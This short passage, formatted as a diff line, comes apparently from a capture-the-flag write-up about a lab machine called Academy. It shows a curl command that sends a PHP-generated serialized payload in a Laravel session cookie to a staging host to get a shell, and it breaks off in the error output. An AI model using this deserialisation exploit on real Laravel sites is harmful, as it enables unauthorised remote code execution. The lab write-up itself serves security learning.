@@ -1,0 +1,1 @@
+UwMzVjMDAyZTUyMzA0N2QwNTgwMDdkMTExN2Y1ZDM1YTc0ZDJjIn0= I can run it in curl just like in the post and get a shell: oxdf@parrot$ curl -s -H "Cookie: laravel_session= $( php gen_serialized.php ) ;" http://dev-staging-01.academy. htb <!DOCTYPE html><!-- UnexpectedValueException: The stream or
